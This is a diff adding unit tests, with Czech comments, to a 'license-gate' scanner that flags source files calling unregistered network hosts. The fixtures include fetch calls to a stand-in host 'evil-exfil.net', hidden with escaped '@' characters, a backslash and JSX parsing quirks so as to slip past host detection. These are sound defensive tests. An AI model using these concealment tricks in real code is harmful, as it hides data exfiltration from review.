@@ -506,6 +506,84 @@ describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
     expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
   });
 
+  it('@ zapsané escapem userinfo bránu neobejde', () => {
+    const dir = makeGreenRepo();
+    // `@` je `@`. Zaslepení escapů dvěma mezerami URL rozdělilo a zbyl z ní
+    // registrovaný host, takže kontrola 5 prošla nad voláním na evil-exfil.net.
+    write(dir, 'src/escaped.ts', "await fetch('https://api.fixture-provider.io\\u0040evil-exfil.net/v1/x');\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('evil-exfil.net (src/escaped.ts)');
+    expect(code).toBe(1);
+  });
+
+  it('@ zapsané hexa escapem taky ne', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/hex.ts', "await fetch('https://api.fixture-provider.io\\x40evil-exfil.net/v1');\n");
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+  });
+
+  it('JSX na řádku neoslepí kontrolu na host za ním', () => {
+    const dir = makeGreenRepo();
+    // `</div>` otevřelo falešný regulární literál, ten spolkl uvozovku a `//`
+    // v následující cestě se pak čtlo jako komentář.
+    write(
+      dir,
+      'src/ui.tsx',
+      "export const f = (t: string) => <div>{t}</div>; const u = 'https://api.fixture-provider.io//a'; const v = 'https://po-jsx.io/v1';\n",
+    );
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('po-jsx.io');
+    expect(code).toBe(1);
+  });
+
+  it('host zapsaný jako IPv6 literál kontrola 5 vidí', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/six.ts', "await fetch('https://[2606:4700:4700::1111]/v1');\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('2606:4700:4700::1111');
+    expect(code).toBe(1);
+  });
+
+  it('nerozparsovatelná URL se nahlásí, ale heslo ani query se nevypíšou', () => {
+    const dir = makeGreenRepo();
+    // Port mimo rozsah — `new URL` to odmítne. Dřív se taková URL vypsala celá.
+    write(dir, 'src/broken.ts', "await fetch('https://svc:tajneheslo@internal.io:99999/v1?token=nevypisovat');\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('nedá se rozparsovat');
+    expect(out).not.toContain('tajneheslo');
+    expect(out).not.toContain('nevypisovat');
+    expect(code).toBe(1);
+  });
+
+  it('údaj v cestě se nevypíše ani u rozparsované URL s userinfo', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/path.ts', "await fetch('https://svc:tajneheslo@api.fixture-provider.io/reset/nevypisovat');\n");
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('***@api.fixture-provider.io');
+    expect(out).not.toContain('tajneheslo');
+    expect(out).not.toContain('nevypisovat');
+  });
+
+  it('zpětné lomítko v URL je nález, ne odhad hostu', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/slash.ts', "await fetch('https://api.fixture-provider.io\\\\@evil-exfil.net/v1');\n");
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('zpětné lomítko');
+  });
+
   it('soubor .mts se skenuje stejně jako .ts', () => {
     const dir = makeGreenRepo();
     write(dir, 'src/edge.mts', "await fetch('https://jen-v-mts.io/v1');\n");
@@ -576,7 +654,7 @@ describe('license-gate: čisté funkce', () => {
 
   it('credentialUrlsIn nahlásí userinfo a nevypíše heslo', () => {
     const found = [...credentialUrlsIn("fetch('https://honza:tajneheslo@sluzba.io/v1');")];
-    expect(found).toEqual(['https://***@sluzba.io/v1']);
+    expect(found).toEqual(['https://***@sluzba.io/…']);
   });
 
   it('credentialUrlsIn mlčí nad běžnou URL', () => {
@@ -585,6 +663,51 @@ describe('license-gate: čisté funkce', () => {
 
   it('hostsIn nevymýšlí host u URL složené za běhu', () => {
     expect([...hostsIn('fetch(`https://${provider}.example/v1`);')]).toEqual([]);
+  });
+
+  it('stripComments dekóduje escape na znak, který znamená', () => {
+    expect(stripComments("const u = 'a\\u0040b';\n")).toContain('a@b');
+    expect(stripComments("const u = 'a\\x40b';\n")).toContain('a@b');
+    expect(stripComments("const u = 'a\\u{40}b';\n")).toContain('a@b');
+  });
+
+  it('stripComments nepovažuje uzavírací JSX značku za regulární literál', () => {
+    const stripped = stripComments("const f = () => <div>{t}</div>; const u = 'https://po-jsx.io//a';\n");
+    expect(stripped).toContain('po-jsx.io//a');
+  });
+
+  it('stripComments přeskočí i regulární literál, který má uvnitř uvozovky', () => {
+    // Zamítat span s uvozovkou se zkoušelo a rozbilo to parsování tohohle
+    // vlastního souboru: `"` uvnitř třídy otevřela režim řetězce a následující
+    // blokový komentář se přečetl jako obsah, takže brána hlásila host z komentáře.
+    const stripped = stripComments("const r = /[^\\]\\s\"'`]*\\//; const u = 'https://za-tridou.io/v1';\n");
+    expect(stripped).toContain('za-tridou.io');
+    expect(stripped).not.toContain('nikdy-tu-nebyl');
+  });
+
+  it('stripComments zahodí blokový komentář za regulárním literálem s uvozovkou', () => {
+    const stripped = stripComments(
+      "const r = /[\"']/;\n/** viz https://uvnitr-bloku.io/docs */\nconst u = 'https://ostry2.io/v1';\n",
+    );
+    expect(stripped).not.toContain('uvnitr-bloku.io');
+    expect(stripped).toContain('ostry2.io');
+  });
+
+  it('hostsIn přečte IPv6 host v hranatých závorkách', () => {
+    expect([...hostsIn("fetch('https://[2606:4700:4700::1111]/v1');")]).toEqual(['[2606:4700:4700::1111]']);
+  });
+
+  it('hostsIn u nerozparsovatelné URL nevypíše ani heslo, ani query', () => {
+    const found = [...hostsIn("fetch('https://svc:tajneheslo@internal.io:99999/v1?token=nevypisovat');")];
+    expect(found).toHaveLength(1);
+    expect(found[0]).not.toContain('tajneheslo');
+    expect(found[0]).not.toContain('nevypisovat');
+    expect(found[0]).toContain('nedá se rozparsovat');
+  });
+
+  it('credentialUrlsIn nevypíše cestu', () => {
+    const found = [...credentialUrlsIn("fetch('https://svc:heslo@sluzba.io/reset/nevypisovat');")];
+    expect(found).toEqual(['https://***@sluzba.io/…']);
   });
 
   it('hostsIn vynechá loopback i jména vyhrazená pro dokumentaci', () => {
